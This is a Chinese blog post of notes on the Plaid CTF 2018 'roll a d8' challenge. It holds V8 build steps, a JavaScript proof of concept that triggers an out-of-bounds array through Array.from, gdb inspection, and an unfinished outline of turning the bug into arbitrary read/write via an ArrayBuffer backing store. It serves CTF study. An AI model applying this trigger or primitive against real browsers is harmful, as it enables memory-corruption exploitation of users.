---
layout: post
title:  "roll a d8"
categories: pwn
tags: browser
excerpt: roll a d8
mathjax: true
---

* content
{:toc}

### Overview
这道题是Plaid CTF 2018 的roll a d8 
题目的漏洞点在于

### 环境准备

git reset --hard 1dab065bb4025bdd663ba12e2e976c34c3fa6599
gclient sync
tools/dev/v8gen.py x64.release

ninja -C out.gn/x64.release

### POC

```
let oobArray = [1.1];
let maxSize = 1028 * 8;
Array.from.call(function() { return oobArray }, {[Symbol.iterator] : _ => (
  {
    counter : 0,
    next() {
      let result = this.counter++;
      if (this.counter > maxSize) {
        oobArray.length = 1;
        return {done: true};
      } else {
        return {value: result, done: false};
      }
    }
  }
) });
console.log(oobArray)
```

首先看Array.from 的功能

`The Array.from() method creates a new, shallow-copied Array instance from an array-like or iterable object.`

```c
console.log(Array.from('foo'));
// expected output: Array ["f", "o", "o"]

console.log(Array.from([1, 2, 3], x => x + x));
// expected output: Array [2, 4, 6]
```

this 指针是函数 `function() { return oobArray }`


### 漏洞利用

JS object 内存布局 Floating Point Number Array

```
gdb ./d8
set args --allow-natives-syntax

d8> a = [1.1,2.2,3.3]
[1.1, 2.2, 3.3]
d8> %DebugPrint(a)
```


oobArray 是一个double 数组，长度要比真实长度要长
如果我们可以放一个ArrayBuffer 到 浮点数fast array 后面，就可以通过oobArray读写kBackingStoreOffset ，利用堆风水



CTF题目

[rollad8-Anciety](https://www.anquanke.com/post/id/147829#h3-16)  
https://xz.aliyun.com/t/5190
https://mem2019.github.io/jekyll/update/2019/07/12/Roll-A-D8.html


漏洞
https://mem2019.github.io/jekyll/update/2019/09/05/Problems-About-Expm1.html
https://abiondo.me/2019/01/02/exploiting-math-expm1-v8/#the-bug
